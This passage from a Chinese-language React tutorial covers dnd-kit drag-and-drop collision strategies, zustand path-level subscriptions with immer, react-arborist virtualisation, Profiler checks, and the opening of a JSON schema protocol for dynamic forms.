  // 触屏：按住 180ms 才启动，8px 容差 → 手指滑动仍是滚动列表
  useSensor(TouchSensor, { activationConstraint: { delay: 180, tolerance: 8 } }),
  // 键盘：配合 sortableKeyboardCoordinates，方向键在"列表间/列表内"正确移动
  useSensor(KeyboardSensor, { coordinateGetter: sortableKeyboardCoordinates }),
)
```

经验值：Pointer `distance` 4–8px；Touch `delay` 150–250ms + `tolerance` 5–8px。另一个缓解手段是**拖拽把手**（`setActivatorNodeRef`）：只有把手区域可拖，元素其余部分正常点击/输入——物料卡片上放一个 ⠿ 图标当把手，点击与拖拽天然分域。键盘 Sensor 是无障碍刚需：Tab 聚焦到条目 → Space 抬起 → 方向键移动（sortableKeyboardCoordinates 让上下左右映射到排序/跨容器语义）→ Space 落下。

#### 碰撞算法：三种算法与嵌套组合策略

拖动过程中，"悬停在谁上"（`over`）由碰撞检测算法裁决。三个内置算法的计算方式与适用面：

| 算法 | 怎么算 | 适用 |
|---|---|---|
| `closestCenter` | 拖拽物中心到各 droppable **中心**的距离，取最近 | 同质条目的排序列表（默认首选） |
| `closestCorners` | 拖拽物与各 droppable 的 4 对角点距离之和，取最小 | 条目**大小不一**时更稳（大容器的中心可能很远，但角点近） |
| `pointerWithin` | **指针坐标**是否落在 droppable 矩形内 | 嵌套容器（判断"指针在哪一层"语义最直接） |
| `rectIntersection` | 拖拽物矩形与 droppable 矩形是否相交 | 大体积拖拽物 / 快速移动的兜底 |

**为什么嵌套容器必用组合策略**——两个原因：

1. **嵌套时矩形重叠**。画布里 grid 套 card 套 grid，外层容器与内层容器的矩形是包含关系，指针同时"在两层里"。用距离法（closestCenter/closestCorners）判层级靠距离直觉，外层容器面积大、中心可能反而更近，会出现"指针明明在内层 grid 上，over 却给了外层"的判定错乱——第 3 章"拖到哪个容器里判定错误"的最大坑源。`pointerWithin` 用"包含关系"直接回答"指针物理在哪一层"，命中的多个容器再按距离排序，通常最内层（矩形最小、离指针最近）胜出，语义正确。
2. **快速移动会"飞出"所有矩形**。指针快速甩动时相邻两帧之间可能没有任何矩形包含指针位置（矩形还在动、指针已出界），单一 `pointerWithin` 会返回空 → over 丢失 → 拖放中断。必须兜底到矩形相交或角点距离。

组合策略的完整实现：

```tsx
import {
  pointerWithin, rectIntersection, closestCorners,
  type CollisionDetection,
} from '@dnd-kit/core'

/** 嵌套容器的组合碰撞：指针包含优先，矩形相交兜底，角点距离收尾 */
const nestedCollisionDetection: CollisionDetection = (args) => {
  // 1. 优先：指针落在哪个 droppable 内（嵌套时内层通常排最前）
  const pointerHits = pointerWithin(args)
  if (pointerHits.length > 0) return pointerHits
  // 2. 兜底：指针飞出所有矩形时，找与拖拽矩形相交的
  const rectHits = rectIntersection(args)
  if (rectHits.length > 0) return rectHits
  // 3. 收尾：连相交都没有（完全脱离），按角点距离找回最近的
  return closestCorners(args)
}
```

第 3 章会把该策略与"容器权重"结合（小容器优先），这里先记住组合的理由。

#### ✍️ 练习完整骨架：两个列表互拖

需求：todo / done 两列，条目可列内排序、可跨列拖动，拖动跟随用 DragOverlay。跨列的体验关键在 `onDragOver` 做**实时搬运**（拖到一半条目就先搬过去），`onDragEnd` 只做列内排序落位：

```tsx
// dnd/CrossList.tsx
import { useState } from 'react'
import {
  DndContext, DragOverlay, PointerSensor,
  useSensor, useSensors, useDroppable, useSortable,
  closestCorners,
  type DragStartEvent, type DragOverEvent, type DragEndEvent,
} from '@dnd-kit/core'
import {
  SortableContext, verticalListSortingStrategy, arrayMove,
} from '@dnd-kit/sortable'
import { CSS } from '@dnd-kit/utilities'

interface Item { id: string; title: string }
type ListKey = 'todo' | 'done'

export function CrossList() {
  const [lists, setLists] = useState<Record<ListKey, Item[]>>({
    todo: [
      { id: 't1', title: '调研 dnd-kit' },
      { id: 't2', title: '实现底座' },
    ],
    done: [{ id: 'd1', title: '读完大纲' }],
  })
  const [activeId, setActiveId] = useState<string | null>(null)

  const sensors = useSensors(
    useSensor(PointerSensor, { activationConstraint: { distance: 5 } }),
  )

  /** id → 所在列表：条目 id 或列表容器 id 都能定位 */
  const findList = (id: string): ListKey | null => {
    if (id === 'todo' || id === 'done') return id
    return (['todo', 'done'] as ListKey[]).find((k) =>
      lists[k].some((item) => item.id === id),
    ) ?? null
  }

  function handleDragStart(e: DragStartEvent) {
    setActiveId(String(e.active.id))
  }

  /** 核心 1：拖动经过另一列时，把条目"实时"搬过去（不等人松手） */
  function handleDragOver(e: DragOverEvent) {
    const { active, over } = e
    if (!over) return
    const activeList = findList(String(active.id))
    const overList = findList(String(over.id))
    if (!activeList || !overList || activeList === overList) return // 同列不用管

    setLists((prev) => {
      const from = prev[activeList]
      const to = prev[overList]
      const activeIndex = from.findIndex((i) => i.id === active.id)
      const overIndex = to.findIndex((i) => i.id === over.id)

      // 悬停目标是列表容器本身（空列表/列表空白处）→ 放末尾
      // 否则按"指针在目标条目上半/下半"决定插它前面还是后面
      let insertIndex = to.length
      if (overIndex >= 0) {
        const activeRect = active.rect.current.translated
        const isBelowOverItem =
          activeRect != null && over.rect != null &&
          activeRect.top > over.rect.top + over.rect.height / 2
        insertIndex = overIndex + (isBelowOverItem ? 1 : 0)
      }

      return {
        ...prev,
        [activeList]: from.filter((i) => i.id !== active.id), // 从源列移除
        [overList]: [
          ...to.slice(0, insertIndex),
          from[activeIndex],                                 // 插入目标列
          ...to.slice(insertIndex),
        ],
      }
    })
  }

  /** 核心 2：松手只处理"同列内排序"（跨列搬运已在 onDragOver 完成） */
  function handleDragEnd(e: DragEndEvent) {
    const { active, over } = e
    setActiveId(null)
    if (!over) return
    const list = findList(String(active.id))
    if (!list) return
    const oldIndex = lists[list].findIndex((i) => i.id === active.id)
    const newIndex = lists[list].findIndex((i) => i.id === over.id)
    if (oldIndex >= 0 && newIndex >= 0 && oldIndex !== newIndex) {
      setLists((prev) => ({
        ...prev,
        [list]: arrayMove(prev[list], oldIndex, newIndex),
      }))
    }
  }

  const activeItem =
    (['todo', 'done'] as ListKey[]).flatMap((k) => lists[k]).find((i) => i.id === activeId)

  return (
    <DndContext
      sensors={sensors}
      collisionDetection={closestCorners}
      onDragStart={handleDragStart}
      onDragOver={handleDragOver}
      onDragEnd={handleDragEnd}
    >
      <div style={{ display: 'flex', gap: 16 }}>
        {(['todo', 'done'] as ListKey[]).map((key) => (
          <SortableContext key={key} items={lists[key].map((i) => i.id)} strategy={verticalListSortingStrategy}>
            <ListColumn columnId={key} items={lists[key]} />
          </SortableContext>
        ))}
      </div>
      <DragOverlay>
        {activeItem ? <div className="card overlay">{activeItem.title}</div> : null}
      </DragOverlay>
    </DndContext>
  )
}

/** 列组件：列表容器本身也是 droppable（空列也要能接收拖入） */
function ListColumn({ columnId, items }: { columnId: string; items: Item[] }) {
  const { setNodeRef, isOver } = useDroppable({ id: columnId })
  return (
    <ul
      ref={setNodeRef}
      style={{
        width: 220, minHeight: 120, listStyle: 'none', padding: 8,
        background: isOver ? 'rgba(56,189,248,.12)' : '#f7f7f7',
      }}
    >
      {items.map((item) => <SortableCard key={item.id} item={item} />)}
    </ul>
  )
}

/** 条目组件：useSortable + 拖拽把手 */
function SortableCard({ item }: { item: Item }) {
  const { attributes, listeners, setNodeRef, setActivatorNodeRef, transform, transition, isDragging } =
    useSortable({ id: item.id })
  return (
    <li
      ref={setNodeRef}
      style={{
        transform: CSS.Transform.toString(transform),
        transition,
        opacity: isDragging ? 0.35 : 1, // 原元素留位变淡；跟随指针的是 DragOverlay 替身
        background: 'white', border: '1px solid #ddd', borderRadius: 6,
        padding: '6px 8px', marginBottom: 6, display: 'flex', gap: 8, alignItems: 'center',
      }}
    >
      <button
        ref={setActivatorNodeRef}
        {...listeners}
        {...attributes}
        style={{ cursor: 'grab', border: 'none', background: 'none' }}
      >
        ⠿
      </button>
      <span>{item.title}</span>
    </li>
  )
}
```

骨架的三个关键决策，迁移到 Kanban 多列（把 `ListKey` 换成任意列 id 数组）只需改数据结构：

1. **列表容器本身注册 droppable**（`useDroppable({ id: columnId })`），空列表才有落点；
2. **跨列搬运放 `onDragOver`**，同列排序放 `onDragEnd`——顺序反了（都在 end 做）会没有"拖过半程条目先跳过去"的体验；
3. **DragOverlay 全程只显示替身**，原元素 `opacity` 压暗但**保留占位**——这就是防布局跳动的落地。

#### 常见坑

- **症状**：给拖拽源加了 onClick，但点不动。
  **根因**：PointerSensor 没有 `activationConstraint.distance`，pointerdown 立即进入拖拽会话，click 被吞。
  **修法**：加 `{ distance: 4 }`；或把拖拽绑定收敛到把手（`setActivatorNodeRef`），点击区与拖拽区分开。
- **症状**：快速拖动时悬停高亮"丢失"（over 变 null，条目闪回原处）。
  **根因**：单一 `pointerWithin` 在指针快速移动时找不到包含矩形。
  **修法**：组合策略（pointerWithin + rectIntersection/closestCorners 兜底）。
- **症状**：嵌套容器里拖放，条目总是落到外层容器。
  **根因**：距离类算法对重叠矩形的判层不可靠。
  **修法**：pointerWithin 优先的组合策略；再给内层小容器加"权重"（自定义 collisionDetection 对内层命中的 id 排序加权，第 3 章实践）。
- **症状**：拖动时整页滚动条疯狂抖动。
  **根因**：自动滚动与 transform 位移互相反馈。
  **修法**：检查被拖元素是否被 `overflow: auto` 容器包裹；给 DndContext 配置合适的 `autoScroll` 选项（如拖拽源在 overlay 模式下不参与测量），或用 DragOverlay 让原元素不再位移。

### 1.7 大 Schema 树性能

- zustand + **path 级 selector 订阅**：每个字段只订阅自己的路径（formily 的核心思想）
- 不可变按路径更新（immer）
- 大纲树虚拟化（react-arborist）
- ✍️ 练习：渲染 1000 节点树，修改单个节点，用 Profiler 验证只有 1 个组件重渲染

#### 为什么大树会卡：先量化问题

一页面 50 个字段的表单、1000 节点的低代码树。假设状态放在单个 state 里、组件全量订阅：每敲一个字符触发一次 set → 50/1000 个组件全部重渲染 + reconciliation。浏览器一帧预算 16.7ms，1000 个组件的 render + diff 轻松吃满，输入法直接感觉到"打字延迟"。**问题的根源不是组件多，而是"变更的粒度是全量、订阅的粒度也是全量"**——解法就是双管齐下：按路径更新（immer）+ 按路径订阅（zustand selector）。这也是 formily 的核心思想：每个字段只关心自己的路径。

#### zustand 的订阅机制：selector 为什么能省钱

zustand 的 `useStore(selector)` 工作方式：**每次 store 发生任何变更，所有组件的 selector 都会重新执行**，但只有 selector 返回值与上次不同（`Object.is` 比较）的组件才重渲染。所以性能取决于"selector 选得准不准"：

- 选得准（只选自己的路径）：别的路径变了，我的 selector 返回同一个引用 → 跳过渲染；
- 选得粗（选整个 store / 整棵树）：任何变化都会让返回值引用改变 → 全量重渲染。

selector 本身执行是很便宜的（一次属性访问/比较），贵的是组件 render——所以"selector 全跑、组件不渲染"就是胜利。

#### 反例：全量订阅的问题

```tsx
// ❌ 反例一：解构整店订阅——任何字段变化都重渲染
const { formData, setValue } = useFormStore()

// ❌ 反例二：看似用了 selector，实际选了整棵树——formData 引用每次都变
const formData = useFormStore((s) => s.formData)
return <input value={formData.name} /> // formData.name 变了，但其余 49 个字段也跟着重渲染
```

反例二的隐蔽性在于"我明明用了 selector"——但 selector 的粒度是整棵 `formData`，immer 更新任何字段都会产生新的 `formData` 根引用，订阅它的所有组件全部命中。**selector 的粒度必须细到"会变的最小单位"**。

#### 正解：path 级 selector 订阅的完整示例

```ts
// stores/formStore.ts
import { create } from 'zustand'
import { produce } from 'immer'

interface FormStore {
  formData: Record<string, unknown> // key 就是字段路径，如 "name"、"users.2.name"
  errors: Record<string, string | undefined>
  setValue: (path: string, value: unknown) => void
  setError: (path: string, error: string | undefined) => void
}

export const useFormStore = create<FormStore>()((set) => ({
  formData: {},
  errors: {},
  setValue: (path, value) =>
    set((state) => ({
      // 不可变按路径更新：只产生新引用的路径见下文 immer 说明
      formData: setByPath(state.formData, path, value),
    })),
  setError: (path, error) =>
    set((state) => ({ errors: setByPath(state.errors, path, error) })),
}))
```

```tsx
// components/Field.tsx —— 每个字段只订阅自己的 value 和 error
import { useFormStore } from '../stores/formStore'
import type { FormFieldSchema } from '../schema/form'

export function Field({ schema }: { schema: FormFieldSchema }) {
  // ✅ path 级订阅：selector 只取本字段的值
  const value = useFormStore((s) => s.formData[schema.fieldPath])
  const error = useFormStore((s) => s.errors[schema.fieldPath])
  const setValue = useFormStore((s) => s.setValue) // action 引用恒定，订阅无成本

  return (
    <label>
      {schema.label}
      <input
        value={typeof value === 'string' ? value : ''}
        onChange={(e) => setValue(schema.fieldPath, e.target.value)}
      />
      {error && <span className="error">{error}</span>}
    </label>
  )
}
```

现在敲"name"字段的一个字符：`setValue('name', ...)` → `formData` 根引用换新，但只有 `"name"` 键的值变了。name 字段的 selector 返回新值 → 重渲染；其余 49 个字段的 selector 返回**同一个字符串/undefined 引用** → `Object.is` 相等 → 跳过。全表 50 个组件只有 1 个重渲染。这就是"path 级订阅"的全部魔法，配合 selector 返回原始值（字符串/数字）时连引用比较都最便宜。

#### immer 按路径更新与"结构共享"

```ts
// utils/setByPath.ts —— 通用路径写入：支持 "users.2.name" 这类点路径
import { produce } from 'immer'

export function setByPath<T>(obj: T, path: string, value: unknown): T {
  return produce(obj, (draft: any) => {
    const keys = path.split('.')
    let cursor = draft
    for (let i = 0; i < keys.length - 1; i++) {
      if (cursor[keys[i]] == null) {
        throw new Error(`路径中断：${keys.slice(0, i + 1).join('.')} 是 null/undefined`)
      }
      cursor = cursor[keys[i]]
    }
    cursor[keys[keys.length - 1]] = value
  })
}
```

immer 的关键性质是**结构共享**：`produce` 返回的新对象里，**未被修改的分支保持原引用**。改 `formData['name']` 时：`formData` 是新的，`formData['name']` 是新的，但 `formData['phone']`、`formData['city']`……全部还是旧引用。这一性质同时喂饱了两端：

1. **selector 订阅端**：订阅其他路径的 selector 拿到旧引用 → `Object.is` 相等 → 不渲染；
2. **memo 端（1.3）**：`NodeView` 收到的 `node` 引用没变 → memo 拦截 → 子树整棵跳过。

若不用 immer 而用 `JSON.parse(JSON.stringify(...))` 或手写展开复制，全树引用换新，上面两端全部失效——"按路径更新"与"按路径订阅"必须成对出现。

#### 树的规范化：扁平化让订阅路径更干净

1.5 的 `SchemaDoc` 已经用了扁平结构（`nodes` 表 + `childIds` 表），这里说明为什么它对性能友好：

```ts
interface FlatTree {
  nodes: Record<string, { id: string; type: string; title: string; props: Record<string, unknown> }>
  childIds: Record<string, string[]> // 每个容器的孩子顺序单独存
  rootId: string
}
```

- 嵌套树存法下，"移动一个节点"要动祖先链上的所有对象（虽然结构共享兜住了渲染，但 patch 路径长、diff 复杂）；扁平存法下移动只是 `childIds` 里两次 splice + `nodes` 零变化；
- 每个节点组件的订阅就是一行：`useTreeStore((s) => s.nodes[id])`——改别的节点，我的 selector 返回同一个 node 对象；
- 撤销补丁的 path 短（`['nodes', id, 'props', key]`），1.5 的历史系统直接受益。

```tsx
// 树节点组件：一个节点只订阅自己
import { memo } from 'react'
import { useTreeStore } from '../stores/treeStore'

export const TreeNode = memo(function TreeNode({ id }: { id: string }) {
  const node = useTreeStore((s) => s.nodes[id]) // ✅ 只订阅本节点
  const childIds = useTreeStore((s) => (node ? s.childIds[id] : undefined))
  if (!node) return null
  return (
    <div>
      <span>{node.title}</span>
      {childIds?.map((childId) => <TreeNode key={childId} id={childId} />)}
    </div>
  )
})
```

#### 大纲树虚拟化：react-arborist

1000 个节点全部渲染 = 1000 个 DOM 子树（即使组件不重渲染，初次挂载和滚动也很重）。虚拟化的思路：**只渲染视口内的行**——1000 节点的树展开后可能有 3000 行，视口里只看得到 20 行，那就只渲染 20 行，滚动时按需换内容。react-arborist 是专为"文件树/大纲树"设计的虚拟树组件，还内置了行级拖拽排序（与 1.6 呼应）：

```tsx
// outline/OutlineTree.tsx
import { Tree } from 'react-arborist'
import { useMemo } from 'react'
import type { FlatTree } from '../stores/treeStore'

/** 扁平树 → arborist 的嵌套 data（id/name/children 是它的默认字段约定） */
interface TreeNodeData { id: string; name: string; children?: TreeNodeData[] }

function buildTreeData(flat: FlatTree, rootId: string): TreeNodeData[] {
  const childrenOf = (parentId: string): TreeNodeData[] | undefined => {
    const ids = flat.childIds[parentId]
    if (!ids?.length) return undefined
    return ids.map((id) => ({ id, name: flat.nodes[id].title, children: childrenOf(id) }))
  }
  return [{ id: rootId, name: flat.nodes[rootId].title, children: childrenOf(rootId) }]
}

export function OutlineTree({
  flat, rootId, selectedId, onSelect,
}: {
  flat: FlatTree; rootId: string; selectedId: string | null; onSelect: (id: string | null) => void
}) {
  const data = useMemo(() => buildTreeData(flat, rootId), [flat, rootId])

  return (
    <Tree
      data={data}                          // 树数据
      width={280}                          // 视口尺寸：虚拟化按此计算可见行
      height={480}
      rowHeight={28}                       // 行高：必须准确（虚拟滚动的数学基础）
      indent={18}                          // 缩进宽度
      selection={selectedId ?? undefined}  // 受控选中：与画布选中态双向联动
      onSelectionChange={(ids) => onSelect(ids[0] ?? null)}
    >
      {({ node, style, dragHandle }) => (
        // style 是虚拟化算出的绝对定位，必须展开到行 div 上
        <div ref={dragHandle} style={{ ...style, display: 'flex', alignItems: 'center', gap: 4 }}>
          <span>{node.isLeaf ? '·' : node.isOpen ? '▾' : '▸'}</span>
          <span>{node.data.name}</span>
        </div>
      )}
    </Tree>
  )
}
```

要点：`height`/`rowHeight` 决定"渲染哪些行"，行高不准会出现滚动跳跃；`style` 必须透传（虚拟定位）；选中态走受控 `selection`，与画布（1.3 的渲染器）选中同一个 store 字段，即得"点树选中画布、点画布高亮树"的双向联动；`dragHandle` 提供行级拖拽（内置实现即可满足大纲树调序，复杂拖拽仍走 1.6 的 dnd-kit）。

#### Profiler 验证步骤（✍️ 练习的验收方法）

目标实验：渲染 1000 节点树，修改单个节点，验证只有 1 个组件重渲染。

**方式一：React DevTools Profiler（可视化）**

1. 安装浏览器扩展 React Developer Tools，打开 Components/Profiler 面板；
2. Profiler 面板左上角设置里勾选 "Record why each component rendered"（记录重渲染原因，便于归因）；
3. 点击左上角录制按钮（圆点）→ 在页面里修改一个节点（比如改它的 title 输入框敲一个字符）→ 点停止；
4. 时间轴出现若干 commit 条。点开最新一条的火焰图：**有颜色 = 本次 commit 渲染了，灰色 = 没渲染**。达标画面：只有 1 个 TreeNode（及其 input）有颜色，其余 999 个全灰；
5. 若不达标，选中被误渲染的组件，右侧 "Why did this render?" 会给出原因（"props changed" / "context changed" / "hook X changed"）——顺藤摸瓜定位订阅泄漏。

**方式二：`<Profiler>` API（可量化、可留档）**

```tsx
import { Profiler } from 'react'

type Phase = 'mount' | 'update' | 'nested-update'

function onRender(
  id: string,
  phase: Phase,
  actualDuration: number, // 本次 commit 实际渲染耗时
  baseDuration: number,   // 整棵子树不 memo 时的基准耗时
): void {
  console.log(`[Profiler:${id}] ${phase} actual=${actualDuration.toFixed(2)}ms`)
}

export function App({ children }: { children: React.ReactNode }) {
  return (
    <Profiler id="schema-tree" onRender={onRender}>
      {children}
    </Profiler>
  )
}
```

达标判据：修改单节点时只产生一条 `update` commit，`actualDuration` 在零点几毫秒量级（对比全量渲染的几十毫秒）。

**常见误判**：StrictMode 开发期会双调用 render，看着像渲染了两次——用 Profiler 看 commit（不是 render 调用数），或先关 StrictMode 复测；父组件重渲染带动子组件（未 memo）也会污染计数，给容器组件补 memo 后再测。

#### 常见坑

- **症状**：已经 path 级订阅了，Profiler 里字段还是全亮。
  **根因**：selector 返回了**新对象**——`useFormStore((s) => ({ v: s.formData.a, e: s.errors.a }))` 每次执行都新建对象，`Object.is` 永不相等。
  **修法**：拆成两个 selector 分别订阅；确实要选对象时用 `useShallow`（zustand v5 从 `zustand/react/shallow` 导入）做浅比较。
- **症状**：zustand v4 升 v5 后，原来 `useStore(selector, shallow)` 的写法类型报错。
  **根因**：v5 移除了 selector 的第二 equalityFn 参数，统一走 `useShallow` 包装。
  **修法**：`import { useShallow } from 'zustand/react/shallow'` 后 `useStore(useShallow((s) => ({ a: s.a, b: s.b })))`。
- **症状**：虚拟树滚动时白屏/行高跳变。
  **根因**：`rowHeight` 与实际行高不符（行内有换行/图标撑高）。
  **修法**：固定行高（行内容溢出用省略号）；确需动态高度时按 arborist 文档配置估高，别硬猜。
- **症状**：改一个节点，它的父链组件也重渲染了。
  **根因**：这不是 bug——immer 结构共享下，被修改路径上的祖先节点引用确实换新了（这是必要的，React 需要新引用才能感知变化）。渲染的是"路径上"的少量组件，数量 = 树深度，可接受；若连"路径外"的兄弟子树也渲染，才是订阅泄漏，回看坑一。

✅ **阶段产出**：一个能渲染嵌套 schema 的 mini renderer + 全局 undo/redo + 表达式求值器。

把产出拆成可验收的三件：

**1. mini renderer（1.1 + 1.2 + 1.3 + 1.7 的合成）**

- 渲染 1.1 的页面协议（嵌套容器 + 原子组件），未注册类型渲染占位而不是白屏；
- 注册表带完整物料元信息（label/icon/defaultProps/setters/isContainer）；
- `NodeView` 用 nodeId 作 key、用 memo 包裹，状态更新走 immer（结构共享）；
- 验收：渲染 1000 节点树，修改单个节点，Profiler 火焰图里只有 1 个节点组件亮起（1.7 的实验步骤）。

**2. 全局 undo/redo（1.5）**

- immer patches 历史栈：commit/undo/redo/jump 齐全；
- 属性输入 300ms 按 mergeKey 合并（连续输入 5 个字符，Cmd+Z 一次回退整串）；
- 产生新操作清空 redo 栈（undo → 新操作 → redo 按钮置灰）；
- Cmd+Z / Cmd+Shift+Z 快捷键与按钮可用态正确。

**3. 表达式求值器（1.4）**

- tokenize → parse → evaluate 三层齐全，通过 1.4 的 10 条测试用例；
- AST 缓存、`checkExpression` 语法检查、`useExpression` hook 可在组件里跑通 `visibleWhen` 联动；
- 坏表达式（语法错、未知变量）不炸页面，返回 undefined 并能在配置期标红。

**自测清单**（全部打勾再进第 2 章）：

- [ ] schema 里没有函数、class、Date——`JSON.stringify` 无损 round-trip；
- [ ] 节点 id 全局唯一且不复用，控制台无 key 警告；
- [ ] 删除/移动/复制节点后（复制递归换 id），各组件内部状态不串位；
- [ ] 改属性 → undo → redo，画布与属性面板状态完全一致；
- [ ] 同一输入框连续输入只占一条历史；结构操作各占一条；
- [ ] 表达式求值异常被兜住，页面不白屏。

这三件产出的复用地图（也是对本章"内核"论的最终验证）：第 2 章动态表单 = 协议 + 注册表 + 渲染器 + 表达式 + path 订阅的整队合练；第 3 章设计器 = 加上 dnd-kit 拖拽 + Setter 自举 + undo 接入；第 4 章仪表盘 = 注册表换一批 panel 物料 + Setter 复用；第 5 章 JSON 编辑器 = 给 schema 开文本消费入口；第 6 章低代码 = 全部总装。底座越扎实，后面每一章越是"组装"而非"新写"。

---

## 2. Schema 动态表单（2 周）

**业务画像**：中后台 50+ 字段配置化表单、SaaS 让接入方自定义字段、一个页面跑 N 套表单配置。

把这三句话拆开看，它们其实是同一个问题的三种表述：

- **中后台 50+ 字段配置化表单**：员工入职、报销、审批这类页面，字段多、联动多、改得勤。手写 JSX 的话，每加一个字段要写"取值 + 校验 + 布局 + 提交"四份代码；产品改需求（加个字段、换个联动）你就要发版。把字段变成 JSON 配置后，改表单 = 改数据，不发版。
- **SaaS 让接入方自定义字段**：你不可能把租户的字段写死在代码里——租户 A 的工单有"紧急程度"，租户 B 没有。字段定义必须来自数据库里的 JSON，前端只负责"解释执行"。
- **一个页面跑 N 套表单配置**：同一个渲染组件，根据 URL 参数加载不同的 schema，渲染出完全不同的表单。这是"渲染器"和"表单定义"彻底分离后的自然能力。

本章要做的就是这样一个**渲染器**：输入是 JSON，输出是一个行为完整（取值、联动、校验、提交）的表单。它会成为第 3 章表单设计器的渲染底座、第 4 章面板配置的属性面板、第 6 章低代码平台的表单渲染器——所以这一章值得花两周做到位。

### 实现路线（顺序即依赖）

这条 1→9 的路线不是并列的功能清单，而是严格的依赖链：没有协议（1）就没有渲染依据，没有渲染器（2）就没有地方挂字段，没有 store（3）字段无处读写，没有订阅模式（4）性能不达标，联动（5）和校验（6）都建立在"值变化 → 精确通知"之上，数组字段（7）是路径系统的进阶应用，异步 options（8）是字段组件的最后一个能力缺口，布局（9）纯是渲染层升级、放最后不影响内核。按顺序做，每一步都有上一步兜底。

#### 1. 字段协议：`{ id, type, label, required, default, options, visibleWhen, disabledWhen, rules }`

**是什么**：字段协议是一份 TS 类型 + 约定，描述"一个字段长什么样、怎么校验、何时显隐"。它是整个体系里最值得反复打磨的一层——协议定错，后面全部返工。

**为什么需要**：回忆底座 1.1 的设计原则——协议必须**可序列化、声明式、带版本号、预留 `x-*` 扩展字段**。落到表单场景意味着三件事：schema 能存数据库、能走网络、能被第 3 章的设计器生成；逻辑（显隐、禁用、校验）用**表达式字符串**表达而不是内联函数；自定义校验器通过**注册表键名**引用而不是闭包。凡是塞进函数的协议都不可序列化，第 3 章"设计器生成 schema"就直接死掉。

**怎么做**：用 discriminated union 按 `type` 收窄每个字段类型的专有属性。完整类型如下。

```ts
// types.ts —— 字段协议全集
export type FieldType =
  | 'input' | 'textarea' | 'number' | 'select' | 'switch' | 'date'
  | 'array' | 'object'      // 值字段
  | 'group' | 'grid'        // 布局字段（不产生数据）

export interface OptionItem {
  label: string
  value: string | number
}

/** 远程 options 的可序列化描述：只有字符串/数字，没有任何函数 */
export interface RemoteOptionsSpec {
  /** URL 模板，{keyword} 会被替换为搜索词，如 '/api/users?q={keyword}' */
  urlTemplate: string
  /** 响应里取数组的路径，如 'data.list' */
  resultPath?: string
  /** 从数组元素里取 label/value 的字段名 */
  labelField?: string
  valueField?: string
  /** 依赖的字段路径（如省 → 市），该字段变化时重新加载 */
  dependsOn?: string
  /** 搜索防抖毫秒数，默认 300 */
  debounce?: number
}

/** 校验规则。custom 是 validatorRegistry 的键名——协议里绝不放函数 */
export interface ValidationRules {
  required?: boolean
  requiredMessage?: string
  /** 正则源字符串，如 '^1\\d{10}$'（序列化时字符串比 RegExp 对象安全） */
  pattern?: string
  patternMessage?: string
  minLength?: number
  maxLength?: number
  min?: number
  max?: number
  /** 指向 validatorRegistry 中注册的校验器键名 */
  custom?: string
  /** 本字段何时校验：blur（默认，失焦即校已 touched 的字段）| change | submit */
  trigger?: 'blur' | 'change' | 'submit'
}

/** 所有字段共享的公共属性 */
export interface BaseFieldSchema {
  /** 字段名，同时是 formData 的键；同名冲突时在 object 内用嵌套路径区分 */
  name: string
  label: string
  required?: boolean
  /** 初始值；缺省时按类型补空白值（见步骤 3 的 normalizeInitialData） */
  default?: unknown
  placeholder?: string
  /**
   * 显隐表达式。求值上下文为 { $form, $item }，$item 仅数组行内字段可用。
   * 例："$form.userType == 'company'"（expr-eval 用 ==，没有 ===）
   */
  visibleWhen?: string
  /** 禁用表达式，语法与求值时机同 visibleWhen */
  disabledWhen?: string
  /** 隐藏后是否清空已填值。false=保留（默认），true=清空。两种策略的业务后果见步骤 5 */
  clearOnHide?: boolean
  rules?: ValidationRules
  /** 预留扩展：协议演进时不破坏旧 schema */
  'x-props'?: Record<string, unknown>
}

export interface InputFieldSchema extends BaseFieldSchema {
  type: 'input' | 'textarea' | 'date'
  maxLength?: number
}
export interface NumberFieldSchema extends BaseFieldSchema {
  type: 'number'
  min?: number
  max?: number
}
export interface SelectFieldSchema extends BaseFieldSchema {
  type: 'select'
  options?: OptionItem[]
  remote?: RemoteOptionsSpec
}
export interface SwitchFieldSchema extends BaseFieldSchema {
  type: 'switch'
}
/** 数组字段：item 是"一行"的字段模板，运行时按行数展开 */
export interface ArrayFieldSchema extends BaseFieldSchema {
  type: 'array'
  item: ObjectFieldSchema
  maxItems?: number
}
/** 嵌套对象字段：子字段路径自动加前缀，如 company.name */
export interface ObjectFieldSchema extends BaseFieldSchema {
  type: 'object'
  fields: FieldSchema[]
}
/** 布局：分组（带标题的 fieldset），不产生数据 */
export interface GroupFieldSchema extends BaseFieldSchema {
  type: 'group'
  collapsible?: boolean
  fields: FieldSchema[]
}
/** 布局：栅格，columns 列 + 每字段 span */
export interface GridFieldSchema extends BaseFieldSchema {
  type: 'grid'
  columns?: number
  fields: Array<FieldSchema & { span?: number }>
}

export type FieldSchema =
  | InputFieldSchema | NumberFieldSchema | SelectFieldSchema | SwitchFieldSchema
  | ArrayFieldSchema | ObjectFieldSchema | GroupFieldSchema | GridFieldSchema

export interface FormSchema {
  formId: string
  /** 协议版本号：从第一天就带上，为将来 migration 链留口子（见第 6 章） */
  version: string
  fields: FieldSchema[]
}

export type FormData = Record<string, unknown>
```

三个**表达式字段**（`visibleWhen` / `disabledWhen`，以及 rules 里将提到的条件思路）是协议里唯一的"逻辑通道"，值得单独说透：

- 它们是字符串表达式，由底座 1.4 的表达式引擎（expr-eval 或你手写的 mini 求值器）在**运行时求值**，求值上下文注入 `$form`（当前表单数据）和 `$item`（数组行数据）。
- 为什么不用函数：函数不可序列化。为什么不用 `eval`：安全 + 作用域失控（底座 1.4 讲过）。为什么不用 JSON 逻辑对象（`{ "and": [...] }`）：可以，但表达式字符串对配置人员可读性最好，且 expr-eval 一行接入。
- 表达式里统一用 `==`：expr-eval 不支持 `===`，写协议时注意。

一份合法 schema 长这样（截取，完整综合示例见步骤 9）：

```json
{
  "formId": "employee-onboarding",
  "version": "1.0.0",
  "fields": [
    {
      "type": "select",
      "name": "userType",
      "label": "人员类型",
      "required": true,
      "options": [
        { "label": "个人", "value": "person" },
        { "label": "企业", "value": "company" }
      ]
    },
    {
      "type": "input",
      "name": "companyName",
      "label": "公司名称",
      "visibleWhen": "$form.userType == 'company'",
      "clearOnHide": true,
      "rules": { "required": true }
    }
  ]
}
```

**常见坑（症状 → 根因 → 修法）**：症状——同事往 schema 里塞了个 `validator: (v) => ...`，JSON.stringify 后变 `null`，配置端保存再读出来校验悄悄失效。根因——协议被函数污染，序列化丢能力。修法——类型层就把 `custom` 限定为 string 键名，运行时查 `validatorRegistry`；code review 时把"schema 里出现 function"当 error 处理。

#### 2. registry + 递归渲染器（复用底座 1.2/1.3）

